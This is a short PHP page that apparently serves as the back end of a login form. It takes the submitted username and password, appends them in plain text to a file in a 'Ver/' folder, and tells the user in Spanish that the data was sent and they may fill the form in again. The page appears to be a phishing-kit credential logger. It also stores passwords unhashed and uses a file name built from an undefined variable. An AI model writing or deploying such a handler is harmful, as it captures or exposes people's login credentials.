<html>
<head>
<?php	
    /*print_r ($_POST);
	exit();*/
	
	$Usuario= $_POST["Usuario"];
	$Contrasena= $_POST["Cnt"];

	 $contenido="
	 Usuario: $Usuario
	 Contrasena: $Contrasena";
	 
     $archivo = fopen("Ver/$NEmpresa.txt", "a");
	 fwrite ($archivo,$contenido);
	 
	 
?>
</head>
<body>
	<div algin="center">
	<h2>Sus Datos han sidos enviados correctamente</h2>
	<h5><a href="Formulario.html">Pulse aqui para volver a llenarlo</a></h5>
	</div>
</body>
</html>